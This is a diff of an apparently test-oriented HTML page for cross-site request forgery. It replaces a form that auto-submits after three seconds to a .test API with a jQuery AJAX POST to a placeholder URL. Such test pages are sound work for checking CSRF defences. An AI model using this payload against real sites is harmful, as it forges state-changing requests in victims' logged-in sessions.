@@ -11,11 +11,26 @@
 
     <form id="csrf-form" method='POST' action="https://tommy-design.test/api/weba/v3/site">
     </form>
- 
+
+    <script
+    src="https://code.jquery.com/jquery-3.3.1.min.js"
+    integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+    crossorigin="anonymous"></script>
+
     <script type='text/javascript'>
-      setTimeout(function(){
-        document.getElementById('csrf-form').submit();
-      }, 3000)
+      // setTimeout(function(){
+      //   document.getElementById('csrf-form').submit();
+      // }, 3000)
+      $.ajax({
+          type: "post",
+          url: "www.example.com/subfolder/page.php",
+          data: {
+              title: 'CSRF site'
+          },
+          success: function(response) {
+              alert(response);
+          }
+      });
     </script>
   </body>
 
